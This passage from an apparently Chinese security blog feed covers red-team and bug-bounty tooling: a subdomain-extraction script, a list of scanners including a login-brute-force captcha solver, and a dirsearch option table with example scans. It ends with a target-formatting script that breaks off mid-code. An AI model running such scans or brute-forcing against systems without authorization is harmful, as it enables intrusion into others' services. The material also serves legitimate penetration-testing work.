class="string">&#x27;是否包含主域名本身&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--output&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;输出结果到文件&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;正在从 <span class="subst">&#123;args.file&#125;</span> 中提取 <span class="subst">&#123;args.domain&#125;</span> 的子域名...&quot;</span>)</span><br><span class="line">    subdomains = extract_subdomains(args.file, args.domain, args.include_main)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> subdomains:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n共找到 <span class="subst">&#123;<span class="built_in">len</span>(subdomains)&#125;</span> 个独特的子域名:&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> subdomain <span class="keyword">in</span> subdomains:</span><br><span class="line">            <span class="built_in">print</span>(subdomain)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> args.output:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(args.output, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">for</span> subdomain <span class="keyword">in</span> subdomains:</span><br><span class="line">                    f.write(subdomain + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n结果已保存到 <span class="subst">&#123;args.output&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n未找到 <span class="subst">&#123;args.domain&#125;</span> 的子域名&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>SRC</category>
      </categories>
      <tags>
        <tag>SRC挖掘思路</tag>
      </tags>
  </entry>
  <entry>
    <title>红队工具</title>
    <url>/RedTeamTools.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h1 id="工具统计"><a href="#工具统计" class="headerlink" title="工具统计"></a>工具统计</h1><h2 id="Vulnerability-Scan"><a href="#Vulnerability-Scan" class="headerlink" title="Vulnerability Scan"></a>Vulnerability Scan</h2><table>
<thead>
<tr>
<th>Tool</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>nuclei</td>
<td>基于yaml格式的POC漏扫工具（命令行形式）</td>
</tr>
<tr>
<td>nuclei-web</td>
<td>少欣自研的基于nuclei+fofa的漏扫平台</td>
</tr>
<tr>
<td>AWVS</td>
<td>国外的漏扫平台，建议在闲鱼上购买当年最新的版本</td>
</tr>
</tbody></table>
<h2 id="Package-Sniffing"><a href="#Package-Sniffing" class="headerlink" title="Package Sniffing"></a>Package Sniffing</h2><table>
<thead>
<tr>
<th>Tool</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>BurpSuite</td>
<td>经典HTTP&#x2F;s抓包工具，插件生态丰富</td>
</tr>
<tr>
<td>Wireshark</td>
<td>抓去整个网卡流量的老牌工具</td>
</tr>
<tr>
<td>Proxifier</td>
<td>代理指定进程的所有流量</td>
</tr>
<tr>
<td>Yakit</td>
<td>国产http&#x2F;s抓包工具，新起之秀，等几年插件生态丰富了再用</td>
</tr>
<tr>
<td>captcha-killer</td>
<td>BurpSuite插件：爆破登录框时，自动识别验证码</td>
</tr>
<tr>
<td>HaE</td>
<td>根据正则表达式在请求或者响应中匹配关键字，然后高亮显示，检测信息泄露非常好用</td>
</tr>
</tbody></table>
<h2 id="Reverse-Engineering"><a href="#Reverse-Engineering" class="headerlink" title="Reverse Engineering"></a>Reverse Engineering</h2><table>
<thead>
<tr>
<th>Tool</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>010Editor</td>
<td>16进制查看工具</td>
</tr>
<tr>
<td>jadx-gui</td>
<td>apk&#x2F;jar静态分析、反编译工具</td>
</tr>
</tbody></table>
<h2 id="All-in"><a href="#All-in" class="headerlink" title="All-in"></a>All-in</h2><table>
<thead>
<tr>
<th>Tool</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>Tscan</td>
<td>聚合了端口扫描、poc扫描、红队常用小工具的GUI程序，基于JAVA实现跨平台</td>
</tr>
</tbody></table>
<h2 id="ObtainInfo"><a href="#ObtainInfo" class="headerlink" title="ObtainInfo"></a>ObtainInfo</h2><table>
<thead>
<tr>
<th>Tool</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>observer_ward</td>
<td>Web finger scanner</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<h1 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h1><h2 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h2><ol>
<li><p>windows平台上，双击启动或者通过自己写的bat&#x2F;vbs启动器运行xray.exe，会出下下面的报错（no command provided）。</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251111101623009.png" alt="image-20251111101623009"></p>
</li>
<li><p>解决方法</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. 手工打开CMD，然后进入到xray.exe所在的目录，再执行xray相关命令（推荐）</span><br><span class="line">2. 如果说你每次打开CMD，都在XX目录，那么将xray所在的目录中的所有文件全部放到XX目录中（注意，是所有内容，而不是整个文件夹），最终将XX目录添加到系统环境变量中即可（不推荐）</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="具体使用"><a href="#具体使用" class="headerlink" title="具体使用"></a>具体使用</h1><h2 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h2><table>
<thead>
<tr>
<th>命令参数</th>
<th>解释（中文）</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>--version</code></td>
<td>显示程序版本号并退出</td>
<td><code>python dirsearch.py --version</code></td>
</tr>
<tr>
<td><code>-h, --help</code></td>
<td>显示帮助信息并退出</td>
<td><code>python dirsearch.py -h</code></td>
</tr>
<tr>
<td><code>-u URL, --url=URL</code></td>
<td>指定目标 URL，可多次使用指定多个 URL</td>
<td><code>python dirsearch.py -u http://example.com</code></td>
</tr>
<tr>
<td><code>-l PATH, --url-file=PATH</code></td>
<td>指定包含多个 URL 的列表文件</td>
<td><code>python dirsearch.py -l urls.txt</code></td>
</tr>
<tr>
<td><code>--stdin</code></td>
<td>从标准输入读取 URL</td>
<td><code>python dirsearch.py --stdin &lt;&lt; cat urls.txt</code></td>
</tr>
<tr>
<td><code>--cidr=CIDR</code></td>
<td>对指定 CIDR 网段内的所有 IP 进行扫描</td>
<td><code>python dirsearch.py --cidr 192.168.1.0/24</code></td>
</tr>
<tr>
<td><code>--raw=PATH</code></td>
<td>从文件加载原始 HTTP 请求，需配合<code>--scheme</code>设置协议</td>
<td><code>python dirsearch.py --raw request.txt --scheme http</code></td>
</tr>
<tr>
<td><code>-s SESSION_FILE, --session=SESSION_FILE</code></td>
<td>指定会话文件，用于保存或加载扫描会话以续扫</td>
<td><code>python dirsearch.py -u http://example.com -s scan.session</code></td>
</tr>
<tr>
<td><code>--config=PATH</code></td>
<td>指定配置文件完整路径，默认<code>config.ini</code></td>
<td><code>python dirsearch.py --config my_config.ini -u http://example.com</code></td>
</tr>
<tr>
<td><code>-w WORDLISTS, --wordlists=WORDLISTS</code></td>
<td>自定义字典，多个字典用逗号分隔</td>
<td><code>python dirsearch.py -u http://example.com -w dict1.txt,dict2.txt</code></td>
</tr>
<tr>
<td><code>-e EXTENSIONS, --extensions=EXTENSIONS</code></td>
<td>指定文件扩展名列表，用逗号分隔</td>
<td><code>python dirsearch.py -u http://example.com -e php,html,js</code></td>
</tr>
<tr>
<td><code>-f, --force-extensions</code></td>
<td>强制在每个字典条目后添加扩展名</td>
<td><code>python dirsearch.py -u http://example.com -e php -f</code></td>
</tr>
<tr>
<td><code>-O, --overwrite-extensions</code></td>
<td>用指定扩展名覆盖字典中已有扩展名</td>
<td><code>python dirsearch.py -u http://example.com -e php -O -w dict.txt</code></td>
</tr>
<tr>
<td><code>--exclude-extensions=EXTENSIONS</code></td>
<td>排除指定扩展名列表，用逗号分隔</td>
<td><code>python dirsearch.py -u http://example.com --exclude-extensions asp,jsp</code></td>
</tr>
<tr>
<td><code>--remove-extensions</code></td>
<td>移除所有路径中的扩展名</td>
<td><code>python dirsearch.py -u http://example.com --remove-extensions</code></td>
</tr>
<tr>
<td><code>--prefixes=PREFIXES</code></td>
<td>为所有字典条目添加自定义前缀，用逗号分隔</td>
<td><code>python dirsearch.py -u http://example.com --prefixes /api,/v1 -w dict.txt</code></td>
</tr>
<tr>
<td><code>--suffixes=SUFFIXES</code></td>
<td>为所有字典条目添加自定义后缀（忽略目录），用逗号分隔</td>
<td><code>python dirsearch.py -u http://example.com --suffixes .bak,.old -w dict.txt</code></td>
</tr>
<tr>
<td><code>-U, --uppercase</code></td>
<td>将字典内容转为大写</td>
<td><code>python dirsearch.py -u http://example.com -U -w dict.txt</code></td>
</tr>
<tr>
<td><code>-L, --lowercase</code></td>
<td>将字典内容转为小写</td>
<td><code>python dirsearch.py -u http://example.com -L -w dict.txt</code></td>
</tr>
<tr>
<td><code>-C, --capital</code></td>
<td>将字典内容每个单词首字母大写</td>
<td><code>python dirsearch.py -u http://example.com -C -w dict.txt</code></td>
</tr>
<tr>
<td><code>-t THREADS, --threads=THREADS</code></td>
<td>指定线程数</td>
<td><code>python dirsearch.py -u http://example.com -t 50</code></td>
</tr>
<tr>
<td><code>-r, --recursive</code></td>
<td>递归暴力扫描子目录</td>
<td><code>python dirsearch.py -u http://example.com -r</code></td>
</tr>
<tr>
<td><code>--deep-recursive</code></td>
<td>对每个目录层级执行递归扫描</td>
<td><code>python dirsearch.py -u http://example.com --deep-recursive</code></td>
</tr>
<tr>
<td><code>--force-recursive</code></td>
<td>对所有找到的路径执行递归暴力扫描（不限于目录）</td>
<td><code>python dirsearch.py -u http://example.com --force-recursive</code></td>
</tr>
<tr>
<td><code>-R DEPTH, --max-recursion-depth=DEPTH</code></td>
<td>指定最大递归深度</td>
<td><code>python dirsearch.py -u http://example.com -r -R 2</code></td>
</tr>
<tr>
<td><code>--recursion-status=CODES</code></td>
<td>指定触发递归扫描的有效状态码（支持范围，逗号分隔）</td>
<td><code>python dirsearch.py -u http://example.com -r --recursion-status 200,301-302</code></td>
</tr>
<tr>
<td><code>--subdirs=SUBDIRS</code></td>
<td>扫描指定 URL 的子目录（逗号分隔）</td>
<td><code>python dirsearch.py -u http://example.com --subdirs /admin,/blog</code></td>
</tr>
<tr>
<td><code>--exclude-subdirs=SUBDIRS</code></td>
<td>递归扫描时排除指定子目录（逗号分隔）</td>
<td><code>python dirsearch.py -u http://example.com -r --exclude-subdirs /tmp,/log</code></td>
</tr>
<tr>
<td><code>-i CODES, --include-status=CODES</code></td>
<td>指定包含的状态码（支持范围，逗号分隔）</td>
<td><code>python dirsearch.py -u http://example.com -i 200,301-302</code></td>
</tr>
<tr>
<td><code>-x CODES, --exclude-status=CODES</code></td>
<td>指定排除的状态码（支持范围，逗号分隔）</td>
<td><code>python dirsearch.py -u http://example.com -x 404,403</code></td>
</tr>
<tr>
<td><code>--exclude-sizes=SIZES</code></td>
<td>按响应大小排除结果（逗号分隔，如 0B,4KB）</td>
<td><code>python dirsearch.py -u http://example.com --exclude-sizes 0B,4KB</code></td>
</tr>
<tr>
<td><code>--exclude-text=TEXTS</code></td>
<td>按响应内容中的文本排除结果，可多次使用</td>
<td><code>python dirsearch.py -u http://example.com --exclude-text &quot;Not Found&quot; --exclude-text &quot;Error&quot;</code></td>
</tr>
<tr>
<td><code>--exclude-regex=REGEX</code></td>
<td>按正则表达式排除响应结果</td>
<td><code>python dirsearch.py -u http://example.com --exclude-regex &quot;404.*Not Found&quot;</code></td>
</tr>
<tr>
<td><code>--exclude-redirect=STRING</code></td>
<td>若重定向 URL 匹配指定正则或文本则排除该响应</td>
<td><code>python dirsearch.py -u http://example.com --exclude-redirect &#39;/index.html&#39;</code></td>
</tr>
<tr>
<td><code>--exclude-response=PATH</code></td>
<td>排除与指定页面响应相似的结果</td>
<td><code>python dirsearch.py -u http://example.com --exclude-response 404.html</code></td>
</tr>
<tr>
<td><code>--skip-on-status=CODES</code></td>
<td>遇到指定状态码时跳过当前目标（支持范围，逗号分隔）</td>
<td><code>python dirsearch.py -u http://example.com --skip-on-status 500-503</code></td>
</tr>
<tr>
<td><code>--min-response-size=LENGTH</code></td>
<td>仅保留响应长度大于该值的结果</td>
<td><code>python dirsearch.py -u http://example.com --min-response-size 100</code></td>
</tr>
<tr>
<td><code>--max-response-size=LENGTH</code></td>
<td>仅保留响应长度小于该值的结果</td>
<td><code>python dirsearch.py -u http://example.com --max-response-size 10000</code></td>
</tr>
<tr>
<td><code>--max-time=SECONDS</code></td>
<td>指定扫描的最大运行时间（秒）</td>
<td><code>python dirsearch.py -u http://example.com --max-time 300</code></td>
</tr>
<tr>
<td><code>--exit-on-error</code></td>
<td>遇到错误时立即退出扫描</td>
<td><code>python dirsearch.py -u http://example.com --exit-on-error</code></td>
</tr>
<tr>
<td><code>-m METHOD, --http-method=METHOD</code></td>
<td>指定 HTTP 请求方法，默认 GET</td>
<td><code>python dirsearch.py -u http://example.com -m POST</code></td>
</tr>
<tr>
<td><code>-d DATA, --data=DATA</code></td>
<td>指定 HTTP 请求数据（用于 POST 等方法）</td>
<td><code>python dirsearch.py -u http://example.com -m POST -d &quot;username=test&amp;password=123&quot;</code></td>
</tr>
<tr>
<td><code>--data-file=PATH</code></td>
<td>指定包含 HTTP 请求数据的文件</td>
<td><code>python dirsearch.py -u http://example.com -m POST --data-file data.txt</code></td>
</tr>
<tr>
<td><code>-H HEADERS, --header=HEADERS</code></td>
<td>指定 HTTP 请求头，可多次使用</td>
<td><code>python dirsearch.py -u http://example.com -H &quot;Authorization: Bearer token&quot; -H &quot;X-Custom: value&quot;</code></td>
</tr>
<tr>
<td><code>--header-file=PATH</code></td>
<td>指定包含 HTTP 请求头的文件</td>
<td><code>python dirsearch.py -u http://example.com --header-file headers.txt</code></td>
</tr>
<tr>
<td><code>-F, --follow-redirects</code></td>
<td>跟随 HTTP 重定向</td>
<td><code>python dirsearch.py -u http://example.com -F</code></td>
</tr>
<tr>
<td><code>--random-agent</code></td>
<td>为每个请求选择随机 User-Agent</td>
<td><code>python dirsearch.py -u http://example.com --random-agent</code></td>
</tr>
<tr>
<td><code>--auth=CREDENTIAL</code></td>
<td>指定认证凭据（如用户名：密码或 Bearer 令牌）</td>
<td><code>python dirsearch.py -u http://example.com --auth &quot;admin:123456&quot;</code> 或 <code>--auth &quot;Bearer abc123&quot;</code></td>
</tr>
<tr>
<td><code>--auth-type=TYPE</code></td>
<td>指定认证类型（basic、digest、bearer 等）</td>
<td><code>python dirsearch.py -u http://example.com --auth &quot;admin:123456&quot; --auth-type basic</code></td>
</tr>
<tr>
<td><code>--cert-file=PATH</code></td>
<td>指定包含客户端证书的文件</td>
<td><code>python dirsearch.py -u https://example.com --cert-file client.crt</code></td>
</tr>
<tr>
<td><code>--key-file=PATH</code></td>
<td>指定包含客户端证书私钥的文件（未加密）</td>
<td><code>python dirsearch.py -u https://example.com --cert-file client.crt --key-file client.key</code></td>
</tr>
<tr>
<td><code>--user-agent=USER_AGENT</code></td>
<td>指定自定义 User-Agent</td>
<td><code>python dirsearch.py -u http://example.com --user-agent &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/118.0.0.0&quot;</code></td>
</tr>
<tr>
<td><code>--cookie=COOKIE</code></td>
<td>指定 HTTP Cookie</td>
<td><code>python dirsearch.py -u http://example.com --cookie &quot;PHPSESSID=abc123; username=admin&quot;</code></td>
</tr>
<tr>
<td><code>--timeout=TIMEOUT</code></td>
<td>指定连接超时时间（秒）</td>
<td><code>python dirsearch.py -u http://example.com --timeout 5</code></td>
</tr>
<tr>
<td><code>--delay=DELAY</code></td>
<td>指定请求之间的延迟（秒）</td>
<td><code>python dirsearch.py -u http://example.com --delay 1</code></td>
</tr>
<tr>
<td><code>--proxy=PROXY</code></td>
<td>指定代理 URL（支持 HTTP&#x2F;SOCKS，可多次使用）</td>
<td><code>python dirsearch.py -u http://example.com --proxy http://127.0.0.1:8080</code></td>
</tr>
<tr>
<td><code>--proxy-file=PATH</code></td>
<td>指定包含代理服务器列表的文件</td>
<td><code>python dirsearch.py -u http://example.com --proxy-file proxies.txt</code></td>
</tr>
<tr>
<td><code>--proxy-auth=CREDENTIAL</code></td>
<td>指定代理认证凭据</td>
<td><code>python dirsearch.py -u http://example.com --proxy http://127.0.0.1:8080 --proxy-auth &quot;user:pass&quot;</code></td>
</tr>
</tbody></table>
<h3 id="目标格式"><a href="#目标格式" class="headerlink" title="目标格式"></a>目标格式</h3><ol>
<li><p>格式要求：协议:&#x2F;&#x2F;主机:端口</p>
</li>
<li><p>格式处理</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, urlunparse</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_target</span>(<span class="params">raw_str: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    第一步：校验字符串是否为合法的目标地址（域名/IP），过滤非地址字符</span></span><br><span class="line"><span class="string">    :param raw_str: 待校验的原始字符串（如&quot;target.com&quot;、&quot;192.168.1.100&quot;、&quot;abcdefg&quot;）</span></span><br><span class="line"><span class="string">    :return: True=合法地址，False=非地址字符</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 1. 先移除字符串前后空格（避免用户输入时的误操作）</span></span><br><span class="line">    raw_str = raw_str.strip()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. 校验是否为IPv4地址（格式：xxx.xxx.xxx.xxx，每个段0-255）</span></span><br><span class="line">    ipv4_pattern = <span class="string">r&quot;^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.)&#123;3&#125;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$&quot;</span></span><br><span class="line">    <span class="keyword">if</span> re.<span class="keyword">match</span>(ipv4_pattern, raw_str):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. 校验是否为域名（需包含“.”，且符合域名规则：字母/数字/连字符，且不包含特殊字符）</span></span><br><span class="line">    <span class="comment"># 域名规则：至少1个“.”，前缀/后缀为字母数字，中间可含连字符（如“target.com”“a-b-c.cn”“api.v1.target.com”）</span></span><br><span class="line">    domain_pattern = <span class="string">r&quot;^[a-zA-Z0-9]([a-zA-Z0-9-]&#123;0,61&#125;[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]&#123;0,61&#125;[a-zA-Z0-9])?)*$&quot;</span></span><br><span class="line">    <span class="comment"># 额外条件：必须包含“.”（排除“abcdefg”这类纯字符），且长度符合域名规范（1-253字符）</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> raw_str <span class="keyword">and</span> <span class="built_in">len</span>(raw_str) &lt;= <span class="number">253</span> <span class="keyword">and</span> re.<span class="keyword">match</span>(domain_pattern, raw_str):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 4. 若包含端口（如“target.com:8080”“192.168.1.1:443”），提取域名/IP后再校验</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;:&quot;</span> <span class="keyword">in</span> raw_str:</span><br><span class="line">        <span class="comment"># 分割“域名/IP”与“端口”（仅按第一个“:”分割，避免IPv6干扰，此处暂不支持IPv6）</span></span><br><span class="line">        host_part, port_part = raw_str.split(<span class="string">&quot;:&quot;</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># 端口需为数字（1-65535），且主机部分需符合域名/IP格式</span></span><br><span class="line">        <span class="keyword">if</span> port_part.isdigit() <span class="keyword">and</span> <span class="number">1</span> &lt;= <span class="built_in">int</span>(port_part) &lt;= <span class="number">65535</span>:</span><br><span class="line">            <span class="keyword">return</span> is_valid_target(host_part)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 5. 非合法地址（如“abcdefg”“123456”“test@target.com”）</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">format_valid_target</span>(<span class="params">raw_url: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    第二步：对合法地址进行标准化格式化，符合dirsearch要求</span></span><br><span class="line"><span class="string">    :param raw_url: 合法的原始地址（如“target.com”“192.168.1.1:8080”“https://target.com/admin”）</span></span><br><span class="line"><span class="string">    :return: 标准化后的URL（如“http://target.com:80”“http://192.168.1.1:8080”“https://target.com:443”）</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 1. 补全协议（无协议时默认补http，后续可手动调整为https）</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&quot;^https?://&quot;</span>, raw_url, re.IGNORECASE):</span><br><span class="line">        raw_url = <span class="string">f&quot;http://<span class="subst">&#123;raw_url&#125;</span>&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. 解析URL结构，统一协议为小写</span></span><br><span class="line">    parsed = urlparse(raw_url)</span><br><span class="line">    scheme = parsed.scheme.lower()</span><br><span class="line">    netloc = parsed.netloc  <span class="comment"># 主机+端口（如“target.com:8080”）</span></span><br><span class="line">    path = parsed.path      <span class="comment"># 路径（如“/admin”）</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. 修正协议与端口的匹配关系（如https用80端口→改为443）</span></span><br><span class="line">    default_ports = &#123;<span class="string">&quot;http&quot;</span>: <span class="string">&quot;80&quot;</span>, <span class="string">&quot;https&quot;</span>: <span class="string">&quot;443&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;:&quot;</span> <span class="keyword">in</span> netloc:</span><br><span class="line">        host, port = netloc.split(<span class="string">&quot;:&quot;</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># 端口非数字时，重置为默认端口</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> port.isdigit() <span class="keyword">or</span> <span class="keyword">not</span> (<span class="number">1</span> &lt;= <span class="built_in">int</span>(port) &lt;= <span class="number">65535</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;⚠️  无效端口：<span class="subst">&#123;port&#125;</span>，已重置为<span class="subst">&#123;scheme&#125;</span>默认端口<span class="subst">&#123;default_ports[scheme]&#125;</span>&quot;</span>)</span><br><span class="line">            netloc = <span class="string">f&quot;<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;default_ports[scheme]&#125;</span>&quot;</span></span><br><span class="line">        <span class="comment"># 协议与端口不匹配时，修正端口</span></span><br><span class="line">        <span class="keyword">elif</span> port != default_ports[scheme]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;⚠️  协议与端口不匹配：<span class="subst">&#123;scheme&#125;</span>使用<span class="subst">&#123;port&#125;</span>端口，已修正为默认<span class="subst">&#123;default_ports[scheme]&#125;</span>端口&quot;</span>)</span><br><span class="line">            netloc = <span class="string">f&quot;<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;default_ports[scheme]&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 无端口时，补充协议默认端口（显式指定更规范，避免dirsearch解析歧义）</span></span><br><span class="line">        netloc = <span class="string">f&quot;<span class="subst">&#123;netloc&#125;</span>:<span class="subst">&#123;default_ports[scheme]&#125;</span>&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 4. 清理冗余路径（仅保留根路径“/”，避免缩小dirsearch扫描范围）</span></span><br><span class="line">    <span class="keyword">if</span> path <span class="keyword">and</span> path != <span class="string">&quot;/&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;⚠️  冗余路径清理：<span class="subst">&#123;raw_url&#125;</span> 的路径<span class="subst">&#123;path&#125;</span>已移除，dirsearch将自动爆破所有路径&quot;</span>)</span><br><span class="line">        path = <span class="string">&quot;/&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 5. 重组URL（清除查询参数、片段等无关内容，如“http://target.com?a=1#top”→“http://target.com:80”）</span></span><br><span class="line">    formatted_url = urlunparse((scheme, netloc, path, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    <span class="comment"># 移除根路径斜杠（如“http://target.com:80/”→“http://target.com:80”，两者等效但更简洁）</span></span><br><span class="line">    formatted_url = re.sub(<span class="string">r&quot;:(\d+)/$&quot;</span>, <span class="string">r&quot;:\1&quot;</span>, formatted_url)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> formatted_url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_targets</span>(<span class="params">input_source: <span class="built_in">str</span>, is_file: <span class="built_in">bool</span>, output_file: <span class="built_in">str</span> = <span class="string">&quot;formatted_targets.txt&quot;</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    整体流程：读取输入→过滤无效地址→格式化合法地址→保存结果</span></span><br><span class="line"><span class="string">    :param input_source: 输入源（文件路径或逗号分隔的字符串）</span></span><br><span class="line"><span class="string">    :param is_file: 是否为文件输入</span></span><br><span class="line"><span class="string">    :param output_file: 格式化结果保存路径</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 1. 读取原始目标列表，过滤空行和注释</span></span><br><span class="line">    raw_targets = []</span><br><span class="line">    <span class="keyword">if</span> is_file:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(input_source, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">                    line = line.strip()</span><br><span class="line">                    <span class="comment"># 跳过空行和“#”开头的注释行</span></span><br><span class="line">                    <span class="keyword">if</span> line <span class="keyword">and</span> <span class="keyword">not</span> line.startswith(<span class="string">&quot;#&quot;</span>):</span><br><span class="line">                        raw_targets.append(line)</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;❌ 错误：文件<span class="subst">&#123;input_source&#125;</span>不存在，请检查路径&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 非文件输入：按逗号分割，过滤空字符串</span></span><br><span class="line">        raw_targets = [t.strip() <span class="keyword">for</span> t <span class="keyword">in</span> input_source.split(<span class="string">&quot;,&quot;</span>) <span class="keyword">if</span> t.strip()]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> raw_targets:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;❌ 未检测到任何有效输入，请检查目标内容&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. 批量处理：校验→格式化</span></span><br><span class="line">    valid_formatted = []</span><br><span class="line">    invalid_list = []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">60</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;开始处理（共<span class="subst">&#123;<span class="built_in">len</span>(raw_targets)&#125;</span>个原始目标）：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">60</span>)</span><br><span class="line">    <span class="keyword">for</span> idx, target <span class="keyword">in</span> <span class="built_in">enumerate</span>(raw_targets, <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> is_valid_target(target):</span><br><span class="line">            <span class="comment"># 合法目标：格式化后加入结果列表</span></span><br><span class="line">            formatted = format_valid_target(target)</span><br><span class="line">            valid_formatted.append(formatted)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;✅ <span class="subst">&#123;idx:2d&#125;</span>. 合法地址：<span class="subst">&#123;target:35s&#125;</span> → 格式化后：<span class="subst">&#123;formatted&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 无效目标：记录到无效列表，不参与后续处理</span></span><br><span class="line">            invalid_list.append(target)</span><br><span 